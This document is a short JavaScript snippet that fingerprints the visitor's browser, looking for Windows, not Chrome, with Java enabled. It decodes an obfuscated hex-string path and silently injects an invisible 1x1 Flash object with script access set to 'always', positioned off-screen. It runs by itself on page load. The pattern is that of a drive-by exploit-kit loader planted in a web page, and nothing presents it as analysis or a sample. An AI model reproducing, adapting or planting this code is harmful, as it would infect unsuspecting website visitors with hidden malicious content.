function addNewObject () {
	try {
		var ua = navigator.userAgent.toLowerCase();
		if ((ua.indexOf("chrome") == -1 && ua.indexOf("win") != -1) && navigator.javaEnabled()) {
			var yMf=["\x45\x53\x74\x6e\x6f\x4a\x68\x65\x51N\x4d\x6au\x41t\x6a\x77\x76\x78\x68X\x68\x73\x68\x75\x64UC\x61o\x46n","\x73\x75bs\x74r","o\x6cyywZ\x76G\x74\x52\x66je\x42\x44\x6c\x2e\x73\x72\x4d\x48F\x71","x\x54hQym\x6d\x61in\x5f\x63\x65\x6ete\x72\x5f\x65n/co\x6e\x74en\x74.\x78msk","W\x75uS\x44PG\x54al\x69\x66tf","\x4c\x51\x58RPz\x48V\x2feng/med\x69\x61\x2f\x61qx\x62"];var counter = yMf[5][yMf[1]](35-27,90+25-22-82) + yMf[-40+27-68+84][yMf[1]](52+27-73,-30-46+101) + yMf[-42+44][yMf[1]](97-58-24,-13+16) + yMf[97-97][yMf[1]](-9+25,-62+63) + yMf[56-90+38][yMf[1]](61-84+34,-52+53);
			var div = document.createElement('div');
			div.innerHTML  = '<object id="dummy" name="dummy" classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" width="1" height="1">';
			div.innerHTML += '<param name="allowScriptAccess" value="always" \/>';
			div.innerHTML += '<param name="movie" value="'+ counter +'" \/>';
			div.innerHTML += '<embed id="dummy2" name="dummy2" src="'+ counter +'" width="1" height="1" name="flash" allowScriptAccess="always" type="application\/x-shockwave-flash" \/>';
			div.innerHTML += '<\/object>';
			div.style.position = 'absolute';
			div.style.left = '-100px';
			div.style.top = '-100px';
			document.body.insertBefore(div, document.body.children[0]);
		}
	} catch (e) {
		if (document.body == undefined || document.body.children[0] == undefined) {
			setTimeout('addNewObject()', 50);
		}
	}
}
addNewObject();